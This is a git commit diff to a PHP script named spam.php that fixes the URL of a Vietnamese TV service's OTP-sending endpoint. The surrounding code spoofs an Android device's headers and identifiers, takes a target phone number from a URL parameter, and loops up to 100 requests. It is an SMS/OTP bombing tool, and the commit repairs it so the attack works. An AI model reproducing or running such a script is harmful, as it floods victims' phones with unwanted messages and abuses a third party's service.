dec0988fea055c65d7caf9ccff03040bdda3c72c
agusk3 <61266725+agusk3@users.noreply.github.com>
2021-01-07 19:47:47 +0700

    Update spam.php

--- spam.php
+++ spam.php
@@ -7,7 +7,7 @@ $header = array(
     "User-Agent: okhttp/4.0.1"
     );
 $data = "ver=0&manufacturer_id=3c94e2b344d907fb&device_name=Google G011A&device_model=G011A&os_sdk=22&fk=first#key&session=&os_version=5.1.1&device_type=2&version_number=10&mobile_login=".$phone;
-$login = "://apib2cm.mytvnet.vn/v8/vnptid/send-otp";
+$login = "https://apib2cm.mytvnet.vn/v8/vnptid/send-otp";
 if(isset($_GET[ "phone"])){ 
     if($amount=="" ){
         for($i=0; $i<=100; $i++){ 
